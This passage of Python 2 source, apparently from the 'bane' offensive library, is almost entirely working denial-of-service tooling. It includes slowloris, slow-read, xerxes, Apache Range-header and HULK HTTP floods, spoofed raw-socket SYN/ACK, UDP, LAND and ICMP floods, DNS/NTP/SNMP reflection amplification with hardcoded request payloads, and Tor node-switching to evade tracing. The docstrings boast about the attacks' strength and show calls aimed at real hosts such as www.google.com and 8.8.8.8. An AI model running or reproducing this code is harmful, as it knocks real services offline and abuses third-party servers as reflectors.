    settor: (set by default to: False) if you want to use tor as SOCKS5 proxy after activating it you must set this parameter to: True

    example:

    >>>import bane
    >>>bane.torshammer('www.google.com',p=80)

    >>>bane.torshammer('www.google.com',p=80,settor=True)

'''
 global target
 target=u
 global port
 port=p
 global timeout
 timeout=maxtime
 global tor
 tor=settor
 for x in range(threads):
     t =reqpost()
     t.start()
def torswitch1(new=30,logs=True):
  '''
    this function is for auto ip switching of tor's nodes, it doesnt work on windows because it use the command on linux to restart tor' service in a chosen interval.

   it takes the following parameters:

   new: (set by default to: 30) the interval in seconds between switching tor's nodes
   logs: (set by default to: True) showing the screen prints

   example:

   >>>import bane
   >>>bane.torswitch1(new=15)
 
'''
  i=0
  if (sys.platform == "win32") or( sys.platform == "win64"):
   print"[-]This option is not for windows"
   i+=1
  if i==0:
   while True:
    os.system('service tor restart')
    if logs==True:
     print"IP changed, sleeping for {} seconds...".format(new)
    time.sleep(new)
def torswitch2(new=30,password=None,p=9051,logs=True):
 '''
   this one does work on any OS, you just need to activate tor's control port 9051 and set the password.

   it takes the next parameters:

   new: (set by default to: 30) the interval in seconds between switching tor's nodes
   password: your password
   p: (set by default to: 9051) tor's control port
   logs: (set by default to: True) showing the screen prints
'''
 if password==None:
  print'you need to put your control port password for authentication!!!'
 else:
  while True:
   with Controller.from_port(port = p) as controller:
    controller.authenticate(password =password )
    controller.signal(Signal.NEWNYM)
    controller.close()
   if logs==True:
    print"IP changed, sleeping for {} seconds...".format(new)
   time.sleep(new)
class xer(threading.Thread):
 def run(self):
  x=pointer
  while True:
   try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.settimeout(timeout)
    s.connect((target,port))
    print"[Connected to {}:{}]".format(target,port)
    while True:
     try:
      s.send("\x00")
      print"[{}: Voly sent]".format(x)
     except Exception as e:
      break
     time.sleep(.2)
   except:
    pass
   time.sleep(.3)
def xerxes(u,p=80,threads=500,maxtime=5):
 '''
   everyone heard about the 'xerxes.c' tool ( https://github.com/zanyarjamal/xerxes/blob/master/xerxes.c ), but not everyone really understand what does it do exactly to take down targets, actually some has claimed that it sends few Gbps :/ (which is something really funny looool) . let me illuminate you: this tool is similar to slowloris, it consume all avaible connections on the server and keep them open as long as possible not by sending partial http headers slowly but by sending "NULL byte character" per connection every 0.3 seconds (so actually it doesn't really send much data). it uses 48 threads and 8 connections per thread, so the maximum number of connections that this tool can create is: 384 connections. that's why it works perfectly against apache for example (maximum number of connections that it handle simultaniously is 256 by dafault) but not against the ones with larger capacity.

  here i did something different a bit but it gave better results: instead of a 8 connections per thread, i used one per thread with infinite loop so when the connection is closed, a new one will be created unlike the C version, and you can use as much as you need of threads for more connections (not just 384)!!! and this gave me a much better results and it will do the same to you ;)

  this function takes the following parameters:
    
  u: target ip or domain
  p: (set by default to: 80) targeted port
  threads: (set by default to: 500) number of connections
  maxtime: (set by default to: 5) the connection timeout flag value

  example:

  >>>import bane
  >>>bane.xerxes('www.google.com',threads=256)

'''
 global pointer
 global target
 target=u
 global port
 port=p
 global timeout
 timeout=maxtime
 for j in range(threads):
    pointer=j
    t=xer()
    t.start()
    time.sleep(.001)
class slrd(threading.Thread):
 def run(self):
  while True:
   try: 
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.settimeout(timeout)
    s.connect((target,port))
    if port==443:
     s=ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
    while True:
     pa=random.choice(paths)
     try:
      g=random.randint(1,2)
      if g==1:
       s.send("GET {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: en-US,en,q=0.5\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nHost: {}\r\n\r\n".format(pa,random.choice(ua),random.randint(300,1000),target))
      else:
       q='q='
       for i in range(10,random.randint(20,50)):
        q+=random.choice(lis)
       s.send("POST {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: en-US,en,q=0.5\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: {}\r\n\r\n{}".format(pa,random.choice(ua),random.randint(300,1000),len(q),target,q))
      d=s.recv(random.randint(rre1,rre2))
      print"Received: {}".format(d)
      time.sleep(random.randint(sre1,sre2))
     except:
      break
    s.close()
   except Exception as e:
    pass
def slowread(u,p=80,threads=500,maxtime=5,speed1=3,speed2=5,read1=1,read2=3):
 '''
   this tool is to perform slow reading attack. i read about this type of attacks on: https://blog.qualys.com/tag/slow-http-attack and tried to do the same thing in python (but in a better way though :p ). on this attack, the attacker is sending a full legitimate HTTP request but reading it slowly to keep the connection open as long as possible. here im doing it a bit different of the original attack with slowhttptest, im sending a normal HTTP request on each thread then read a small part of it (between 1 to 3 bytes randomly sized) then it sleeps for few seconds (3 to 5 seconds randomly sized too), then it sends another request and keep doing the same and keeping the connection open forever.

   it takes the following parameters:

   u: target ip or domain
   p: (set by default to: 80)
   threads: (set by default to: 500) number of connections
   maxtime: (set by default to: 5) connection timeout flag 

   example:

   >>>import bane
   >>>bane.slowread('www.google.com',p=443,threads=300,maxtime=7)

'''
 global target
 target=u
 global port
 port=p
 global timeout
 timeout=maxtime
 global sre1
 sre1=speed1
 global sre2
 sre2=speed2
 global rre1
 rre1=read1
 global rre2
 rre2=read2
 for x in range(threads):
  t= slrd()
  t.start()
class apa(threading.Thread):
 def run(self):
  global counter
  while True:
   try:
    apache="5-0"
    for x in range(1,random.randint(1200,1300)):
     apache+=',5-'+str(x)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target, port))
    if port==443:
     s=ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
    for x in range(5,random.randint(packs2,packs1)):
     s.send("GET {} HTTP/1.1\r\nHost: {}\r\nRange: bytes=0-,{}\r\nUser-Agent: {}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nConnection: keep-alive\r\n".format(random.choice(paths),target,apache,random.choice(ua)))
     time.sleep(speed)
     counter+=1
     print'Requests sent: {}'.format(counter)
   except:
    pass
def apachekiller(u,p=80,threads=256,maxtime=5,roundmin=5,roundmax=15,level=1):
 '''
   this is a python version of the apache killer tool which was originally written in perl.

   it takes the following parameters:

   u: target ip or domain
   p: (set by default to: 80)
   threads: (set by default to: 256) number of connections
   maxtime: (set by default to: 5) connection timeout flag 

   example:

   >>>import bane
   >>>bane.apachekiller('www.google.com',p=80)

'''
 global target
 target=u
 global port
 port=p
 global timeout
 timeout=maxtime
 global packs1
 packs1=roundmax
 global packs2
 packs2=roundmin
 global speed
 if level<=1:
  speed=0.1
 elif level==2:
  speed=0.05
 elif level==3:
  speed=0.01
 elif level==4:
  speed=0.005
 elif level>=5:
  speed=0.001
 for x in range(threads):
  apa().start()
class loris(threading.Thread):
 def run(self):
  global counter
  ls=[]
  print'\tBuilding sockets...'
  time.sleep(1)
  while True:
   try:
    s =socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    s.connect((target,port))
    if port==443:
     s=ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
    s.send("GET {} HTTP/1.1\r\n".format(random.choice(paths)).encode("utf-8"))
    s.send("User-Agent: {}\r\n".format(random.choice(ua)).encode("utf-8"))
    s.send("Accept-language: en-US,en,q=0.5\r\n".encode("utf-8"))
    s.send("Connection: keep-alive\r\n".encode("utf-8"))
    ls.append(s)
    counter+=1
   except Exception as e:
    pass
   for so in list(ls):
    try:
     so.send("X-a: {}\r\n".format(random.randint(1, 1000000)).encode("utf-8"))
    except socket.error as e:
     ls.remove(so)
     counter=counter-1
     if counter<0:
      counter=0
   sys.stdout.write("\r\tSockets alive: {}".format(counter))
   sys.stdout.flush()
def slowloris(u,p=80,threads=20,maxtime=5):
 '''
   this function is for advanced slowloris attack. here this script is acting differently, it uses the threads to consume the target's available connections but without connections' count limit, so it keeps consuming the server's connections till it becomes unavailable.
   on each thread, it opens a connection, sends a partial HTTP request then it append it to a list, it continue doing this without stopping even if the target is down and all of this after each try to open new connection it sends random X-a: header value to keep all created connections open without reaching the timeout value.

   it takes the following parameters:

   u: target ip or domain
   p: (set by default to: 80)
   threads: (set by default to: 20) number of threads
   maxtime: (set by default to: 5) connection timeout flag 

'''
 global target
 target=u
 global port
 port=p
 global timeout
 timeout=maxtime
 for x in range(threads):
  t=loris()
  t.start()
  time.sleep(.01)
class phu(threading.Thread):
 def run(self):
  global counter
  while True:
   u=random.choice(paths)
   try:
    q=""
    for x in range(random.randint(2,5)):
     q+=random.choice(lis)+str(random.randint(1,1000000))
    p=""
    for x in range(random.randint(2,5)):
     p+=random.choice(lis)+str(random.randint(1,1000000))
    if '?' in u:
      jo='&'
    else:
      jo='?' 
    u+=jo+q+"="+p
    pr=random.choice(httplist)
    proxy = urllib2.ProxyHandler({ 'http': pr, 'https': pr })
    opener = urllib2.build_opener(proxy) 
    urllib2.install_opener(opener)
    urllib2.urlopen("http://"+target+u,timeout=timeout)
    counter+=1
    print"[!]Requests: {} | Bot: {}".format(counter,pr.split(':')[0])
   except Exception as e:
    pass
class hu(threading.Thread):
 def run(self):
  global counter
  while True:
     u=random.choice(paths)
     q=''
     for i in range(random.randint(2,5)):
      q+=random.choice(lis)+str(random.randint(1,100000))
     s=''
     for i in range(random.randint(2,5)):
      s+=random.choice(lis)+str(random.randint(1,100000))
     p=''
     for i in range(random.randint(2,5)):
      p+=random.choice(lis)+str(random.randint(1,100000))
     if '?' in u:
      jo='&'
     else:
      jo='?' 
     u+=jo+q+"="+s
     request = urllib2.Request('http://'+target+u)
     request.add_header('User-Agent', random.choice(ua))
     request.add_header('Cache-Control', 'no-cache')
     request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
     request.add_header('Referer', random.choice(referers) +p)
     request.add_header('Keep-Alive', random.randint(100,500))
     request.add_header('Connection', 'keep-alive')
     request.add_header('Host',target)
     try:
      urllib2.urlopen(request,timeout=timeout)             
      counter+=1
      print"Requests: {}".format(counter)
     except urllib2.HTTPError as ex:
      counter+=1
      print"Requests: {}".format(counter)
     except Exception as e:
      pass
def hulk(u,threads=700,maxtime=10):
 '''
   this function is used for hulk attack with more complex modification (more than 10k useragents and references, also a better way to generate random http GET parameters.
    
   it takes the following parameters:

   u: target domain
   threads: (set by default to: 700) number of connections
   maxtime: (set by default to: 10) connection timeout flag

   example:

   >>>import bane
   >>>bane.hulk('www.google.com',threads=1000)

'''
 global target
 target=u
 global timeout
 timeout=maxtime
 for x in range(threads):
  t= hu()
  t.start()
def proxhulk(u,threads=700,httpl=None,maxtime=10):
 '''

   it takes the following parameters:

   u: target domain
   httpl: (set by default to: None) custom http proxies list
   threads: (set by default to: 700) number of connections
   maxtime: (set by default to: 10) connection timeout flag 

   example:

   >>>import bane
   >>>bane.proxhulk('www.google.com',threads=700,httpl=your_http_proxies_list['ip:port','ip:port'])

   >>>bane.proxhulk('www.google.com')

'''
 global target
 target=u
 global httplist
 if httpl:
  httplist=httpl
 else:
  httplist=masshttp()
 global timeout
 timeout=maxtime
 for x in range(threads):
   t=phu()
   t.start()
def checksum(msg):
 '''
   this function is used for the SYN flood checksum.

   it takes an input and returns it checksum.

'''
 s = 0
 for i in range(0, len(msg), 2):
   if i+1==len(msg):
     w = ord(msg[i])
     s += w
   else:
    w = ord(msg[i]) + (ord(msg[i+1]) << 8 )
    s += w
 s = (s>>16) + (s & 0xffff);
 s = s + (s >> 16);
 s = ~s & 0xffff
 return s
class sflood(threading.Thread): 
 def run(self):
  global counter
  while True:
   try:
    dip=target
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    sp=random.randint(1024,65500)
    if tcpf==True:
     urd=''
     req='TCP'
     for x in range(random.randint(1*amp,3*amp)):
      urd+=str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)
     if len(urd)>1400:
      urd=urd[0:1400]
    else:
     pths=random.choice(paths)
     for l in range(random.randint(1,5)):
      ed=random.choice(ec)
      oi=random.randint(1,3)
      if oi==2:
       gy=0
       while gy<1:
         df=random.choice(ec)
         if df!=ed:
          gy+=1
       ed+=', '
       ed+=df
      l=random.choice(al)
      for n in range(random.randint(0,5)):
       l+=';q={},'.format(round(random.uniform(.1,1),1))+random.choice(al)
      kl=random.randint(1,2)
      if kl==1:
       req="GET"
       urd='GET {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept: {}\r\nAccept-Language: {}\r\nAccept-Encoding: {}\r\nAccept-Charset: {}\r\nKeep-Alive: {}\r\nConnection: Keep-Alive\r\nCache-Control: {}\r\nHost: {}\r\n\r\n'.format(pths,random.choice(ua),random.choice(a),l,ed,random.choice(ac),random.randint(100,1000),random.choice(cc),target)
      else:
       req="POST"
       k=''
       for _ in range(1,random.randint(2,5)):
        k+=random.choice(lis)
       k+=str(random.randint(1,10000))+random.choice(lis)+random.choice(lis)
       for _ in range(1,random.randint(1,3)):
        k+=random.choice(lis)
       j=''
       for x in range(0,random.randint(11,31)):
        j+=random.choice(lis)
       par =(k*random.randint(3,5))+str(random.randint(1,100000))+'='+(j*random.randint(20,30))+str(random.randint(1,10000))+random.choice(lis)+random.choice(lis)
       urd= "POST {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: {}\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: {}\r\n\r\n{}".format(pths,random.choice(ua),l,random.randint(300,1000),len(par),target,par)
    p=random.randint(1,5) 
    if p==1:
     ot=random.randint(1,9)
    elif p==2:
     ot=random.randint(11,126)
    elif p==3:
     ot=random.randint(128,171)
    elif p==4:
     ot=random.randint(173,191)
    elif p==5:
     ot=random.randint(193,223)
    sip=str(ot)+'.'+str(random.randint(0,255))+'.'+str(random.randint(0,255))+'.'+str(random.randint(0,255))
    ips = socket.inet_aton(sip)
    ipd = socket.inet_aton(dip)
    iphv = (4 << 4) + 5
    iph = pack('!BBHHHBBH4s4s' , iphv, 0, 0, random.randint(1,65535), 0, random.randint(minttl,maxttl), socket.IPPROTO_TCP, 0, ips, ipd)
    tcr = (5 << 4) + 0
    if paylo==False:
     urd=''
    tf = finf + (synf << 1) + (rstf << 2) + (pshf <<3) + (ackf << 4) + (urgf << 5)
    if winds=='null':
     windf=0
    if winds=="random":
     windf=random.randint(0,65535)
    thd = pack('!HHLLBBHHH' , sp, port, 0 , ackf, 5, tf, socket.htons(windf) , 0, 0)
    source_address = socket.inet_aton( sip ) 
    dest_address = socket.inet_aton(dip) 
    tcl = len(thd) + len(urd) 
    psh = pack('!4s4sBBH' , source_address , dest_address , 0, socket.IPPROTO_TCP , tcl); 
    psh = psh + thd + urd; 
    tk = checksum(psh)
    tcp_header = pack('!HHLLBBH',sp, port, 0, ackf, (5 << 4) + 0 , tf, socket.htons (windf))+pack('H',tk)+pack('!H',0)
    packet = iph + tcp_header + urd
    s.sendto(packet, (dip,port))
    counter+=1
    print"[!]Packets: {} | IP: {} | Type: {} | Bytes: {}".format(counter,sip,req,len(packet))
   except Exception as e:
    pass
   time.sleep(.1)
def synflood(u,p=80,threads=100,syn=1,rst=0,psh=0,ack=0,urg=0,fin=0,tcp=False,window="random",payloads=True,low=64,maxi=64,ampli=15):
  '''
   this function is for TCP flags floods with spoofed randomly IPs. you can launch any type of spoofed TCP floods by modifying the parameters (SYN, SYN-ACK, ACK, ACK-PSH, FIN...) and another wonderful thing here is that you can also send either spoofed legitimte HTTP requests (GET & POST), randomly created TCP data (which you can control their size), or just send no data with the spoofed packets, also you can modify the window size and Time To Live (TTL) values for more random and unique packets!!! now this is something you won't fine anywhere else on github or stackoverflow ;).

   it takes the following paramters:

   u: target IP
   p: (set by default to: 80) target port
   threads: (set by default to: 100)
   syn: (set by default to: 1) syn flag value
   ack,psh,rst,urg,fin: (set by default to: 0) the other TCP flags values
   tcp: (set by default to: False) set to True to send random strings instead of http requests
   window: (set by default to: "random" for random values between 0 and 65535) tcp window size, set to "null" if you want 0 window size
   payloads: (set by default to: True) set to False to send no extra data
   low,maxi: (set by default to: 64) maximum and minimum TTL values
   ampli: (set by default to:15) multiplication of the TCP strings' size

   example:

   #to launch a syn flood
   >>>bane.synflood('8.8.8.8')

   #to launch ack flood
   >>>bane.synflood('8.8.8.8',syn=0,ack=1)

'''
  global target
  target=u
  global port
  port=p
  global synf
  synf=syn
  global rstf
  rstf=rst
  global pshf
  pshf=psh
  global ackf
  ackf=ack
  global urgf
  urgf=urg
  global finf
  finf=fin
  global tcpf
  tcpf=tcp
  global winds
  winds=window
  global paylo
  paylo=payloads
  global maxttl
  maxttl=maxi
  global minttl
  minttl=low
  global amp
  if ampli<1:
   ampli=1
  if ampli>15:
   ampli=15
  amp=ampli
  wh=0
  try:
   s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
   wh+=1
  except socket.error , msg:
   print '[-]Socket could not be created:',msg[1],'\n(you need root privileges)'
  if wh>0:  
   for x in range(threads):
    t= sflood()
    t.start()
class udpsp(threading.Thread):
 def run(self):
  global counter
  while True:
   try:
    msg=''
    for x in range(random.randint(1*amp,3*amp)):
     msg+=str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)
    if len(msg)>1400:
     msg=msg[0:1400]
    p=random.randint(1,5) 
    if p==1:
     ot=random.randint(1,9)
    elif p==2:
     ot=random.randint(11,126)
    elif p==3:
     ot=random.randint(128,171)
    elif p==4:
     ot=random.randint(173,191)
    elif p==5:
     ot=random.randint(193,223)
    sip=str(ot)+'.'+str(random.randint(0,255))+'.'+str(random.randint(0,255))+'.'+str(random.randint(0,255))
    packet = IP(ttl=random.randint(minttl,maxttl),src=sip, dst=target)/UDP(sport=random.randint(1024,65500),dport=port)/msg
    s= socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    s.sendto(str(packet),(target,port))
    counter+=1
    print"[!]Packets: {} | IP: {} | Type: UDP | Bytes: {}".format(counter,sip,len(packet)) 
    time.sleep(.1)
   except Exception as e:
    pass
def udpstorm(u,p=80,threads=100,low=64,maxi=64,ampli=15):
 '''
   this function is for UDP flood attack using spoofed sources
'''
 global target
 target=u
 global port
 port=p
 global amp
 if ampli<1:
  ampli=1
 if ampli>15:
  ampli=15
 amp=ampli
 global maxttl
 maxttl=maxi
 global minttl
 minttl=low
 wh=0
 try:
  s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
  wh+=1
 except socket.error , msg:
  print '[-]Socket could not be created:',msg[1],'\n(you need root privileges)'
 if wh>0:  
  for x in range(threads):
   udpsp().start()
class ln(threading.Thread):
 def run(self):
  global counter
  while True:
   if winds=='null':
     windf=0
   if winds=="random":
     windf=random.randint(0,65535)
   try:
    if tcpf==True:
     msg=''
     req='TCP'
     for x in range(random.randint(1*amp,3*amp)):
      msg+=str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)
     if len(msg)>1400:
      msg=msg[0:1400]
    else:
     pths=random.choice(paths)
     for l in range(random.randint(1,5)):
      ed=random.choice(ec)
      oi=random.randint(1,3)
      if oi==2:
       gy=0
       while gy<1:
         df=random.choice(ec)
         if df!=ed:
          gy+=1
       ed+=', '
       ed+=df
      l=random.choice(al)
      for n in range(random.randint(0,5)):
       l+=';q={},'.format(round(random.uniform(.1,1),1))+random.choice(al)
      kl=random.randint(1,2)
      if kl==1:
       req="GET"
       msg='GET {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept: {}\r\nAccept-Language: {}\r\nAccept-Encoding: {}\r\nAccept-Charset: {}\r\nKeep-Alive: {}\r\nConnection: Keep-Alive\r\nCache-Control: {}\r\nHost: {}\r\n\r\n'.format(pths,random.choice(ua),random.choice(a),l,ed,random.choice(ac),random.randint(100,1000),random.choice(cc),target)
      else:
       req="POST"
       k=''
       for _ in range(1,random.randint(2,5)):
        k+=random.choice(lis)
       k+=str(random.randint(1,10000))+random.choice(lis)+random.choice(lis)
       for _ in range(1,random.randint(1,3)):
        k+=random.choice(lis)
       j=''
       for x in range(0,random.randint(11,31)):
        j+=random.choice(lis)
       par =(k*random.randint(3,5))+str(random.randint(1,100000))+'='+(j*random.randint(20,30))+str(random.randint(1,10000))+random.choice(lis)+random.choice(lis)
       msg= "POST {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: {}\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: {}\r\n\r\n{}".format(pths,random.choice(ua),l,random.randint(300,1000),len(par),target,par)
    if paylo==False:
     msg=''
    packet = IP(ttl=random.randint(minttl,maxttl),src=target, dst=target)/TCP(window=windf,sport=port,dport=port)/msg
    s= socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    s.sendto(str(packet),(target,port))
    counter+=1
    print"[!]Packets: {} | Type: {} | Bytes: {}".format(counter,req,len(packet)) 
    time.sleep(.1)
   except Exception as e:
    pass
def land(u,p=80,threads=100,low=64,maxi=64,ampli=15,tcp=False,payloads=False,window="random"):
 '''
   this function is for LAND attack in which we are spoofing the victim's IP and targeted port.
'''
 global target
 target=u
 global port
 port=p
 global amp
 if ampli<1:
  ampli=1
 if ampli>15:
  ampli=15
 amp=ampli
 global maxttl
 maxttl=maxi
 global minttl
 minttl=low
 global tcpf
 tcpf=tcp
 global paylo
 paylo=payloads
 global winds
 winds=window
 wh=0
 try:
  s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
  wh+=1
 except socket.error , msg:
  print '[-]Socket could not be created:',msg[1],'\n(you need root privileges)'
 if wh>0:  
  for x in range(threads):
   ln().start()
class dampli(threading.Thread):
 def run(self):
  global counter
  while True:
   try:
    ip=random.choice(dnsl)
    packet= IP(src=target, dst=ip)/UDP(sport=random.randint(1025,65500),dport=53)/DNS(rd=1L, qd=DNSQR(qname=random.choice(domainl), qtype=query, qclass=quclass))
    s= socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    s.sendto(str(packet),(ip,53))
    counter+=1
    print "[!]Packets sent: {} | IP: {}".format(counter,ip)
   except Exception as e:
    pass
   time.sleep(.1)
def dnsamplif(u,dnslist=[],threads=100,q='ALL',cl='IN'):
 '''
   this function is for DNS amplification attack using and list of DNS servers provided by the user.

   it takes the following parameters:

   u: target IP
   dnslist: your DNS servers list
   threads: (set by default to: 100)
   q: (set by default to: "ALL") query type
   cl: (set by default to: "IN") query's class

   exapmle:

   >>>a=['124.0.2.2','22.3.55.45',.........]
   >>>bane.dnsamplif('8.8.8.8',dnslist=a)

'''
 global target
 target=u
 global dnsl
 dnsl=dnslist
 global query
 query=q
 global quclass
 quclass=cl
 wh=0
 try:
  s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
  wh+=1
 except socket.error , msg:
  print '[-]Socket could not be created:',msg[1],'\n(you need root privileges)'
 if wh>0:  
  for x in range(threads):
   dampli().start()
class nampli(threading.Thread):
 def run(self):
  global counter
  data='\x17\x00\x02\x2a'+'\x00'*4
  while True:
   try:
    ip=random.choice(ntpl)
    packet=IP(src=target, dst=ip)/UDP(sport=random.randint(1025,65500),dport=123)/Raw(load=data)
    s= socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    s.sendto(str(packet),(ip,123))
    counter+=1
    print "[!]Packets sent: {} | IP: {}".format(counter,ip)
   except Exception as e:
    pass
   time.sleep(.1)
def ntpamplif(u,ntplist=[],threads=100):
 '''
   this function is for NTP amplification attack using and list of DNS servers provided by the user.

   it takes the following parameters:

   u: target IP
   dnslist: your NTP servers list
   threads: (set by default to: 100)

   exapmle:

   >>>a=['124.0.2.2','22.3.55.45',.........]
   >>>bane.ntpamplif('8.8.8.8',ntplist=a)

'''
 global target
 target=u
 global ntpl
 ntpl=ntplist
 wh=0
 try:
  s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
  wh+=1
 except socket.error , msg:
  print '[-]Socket could not be created:',msg[1],'\n(you need root privileges)'
 if wh>0:  
  for x in range(threads):
   nampli().start()
class snampli(threading.Thread):
 def run(self):
  global counter
  data= '\x30\x26\x02\x01\x01\x04\x06\x70\x75\x62\x6c\x69\x63\xa5\x19\x02\x04\x71\xb4\xb5\x68\x02\x01\x00\x02\x01\x7F\x30\x0b\x30\x09\x06\x05\x2b\x06\x01\x02\x01\x05\x00'
  while True:
   try:
    ip=random.choice(snmpl)
    packet=IP(src=target, dst=ip)/UDP(sport=random.randint(1025,65500),dport=161)/Raw(load=data)
    s= socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    s.sendto(str(packet),(ip,161))
    counter+=1
    print "[!]Packets sent: {} | IP: {}".format(counter,ip)
   except Exception as e:
    pass
   time.sleep(.1)
def snmpamplif(u,snmplist=[],threads=100):
 '''
   this function is for SNMP amplification attack using and list of DNS servers provided by the user.

   it takes the following parameters:

   u: target IP
   dnslist: your SNMP servers list
   threads: (set by default to: 100)
  
   exapmle:

   >>>a=['124.0.2.2','22.3.55.45',.........]
   >>>bane.snmpamplif('8.8.8.8',snmplist=a)

'''
 global target
 target=u
 global snmpl
 snmpl=snmplist
 wh=0
 try:
  s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
  wh+=1
 except socket.error , msg:
  print '[-]Socket could not be created:',msg[1],'\n(you need root privileges)'
 if wh>0:  
  for x in range(threads):
   snampli().start()
class icmpcl(threading.Thread):
 def run(self):
  global counter
  while True:
   data=''
   for x in range(random.randint(1*amp,3*amp)):
    data +=str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)
   if len(data)>1400:
    data=data[0:1400]
   try:
    packet=IP(ttl=random.randint(minttl,maxttl),dst=target)/ICMP()/data
    s= socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    s.sendto(str(packet),(target,port))
    counter+=1
    print "[!]Packets sent: {} | Bytes: {}".format(counter,len(data))
   except Exception as e:
    pass
   time.sleep(.1)
def icmp(u,p=80,ampli=15,low=64,maxi=64,threads=100):
 '''
   this function is for ICMP flood attack
'''
 global target
 target=u
 global port
 port=p
 global amp
 if ampli<1:
  ampli=1
 if ampli>15:
  ampli=15
 amp=ampli
 global maxttl
 maxttl=maxi
 global minttl
 minttl=low
 wh=0
 try:
  s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
  wh+=1
 except socket.error , msg:
  print '[-]Socket could not be created:',msg[1],'\n(you need root privileges)'
 if wh>0:  
  for x in range(threads):
   icmpcl().start()
class icmpst(threading.Thread):
 def run(self):
  global counter
  while True:
   data=''
   for x in range(random.randint(1*amp,3*amp)):
    data +=str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)
   if len(data)>1400:
    data=data[0:1400]
   try:
    p=random.randint(1,5) 
    if p==1:
     ot=random.randint(1,9)
    elif p==2:
     ot=random.randint(11,126)
    elif p==3:
     ot=random.randint(128,171)
    elif p==4:
     ot=random.randint(173,191)
    elif p==5:
     ot=random.randint(193,223)
    sip=str(ot)+'.'+str(random.randint(0,255))+'.'+str(random.randint(0,255))+'.'+str(random.randint(0,255))
    packet=IP(ttl=random.randint(minttl,maxttl),src=sip,dst=target)/ICMP()/data
    s= socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    s.sendto(str(packet),(target,port))
    counter+=1
    print "[!]Packets sent: {} | IP: {} | Bytes: {}".format(counter,sip,len(data))
   except Exception as e:
    pass
   time.sleep(.1)
def icmpstorm(u,p=80,ampli=15,low=64,maxi=64,threads=100):
 '''
   this function is for ICMP flood with spoofed sources
'''
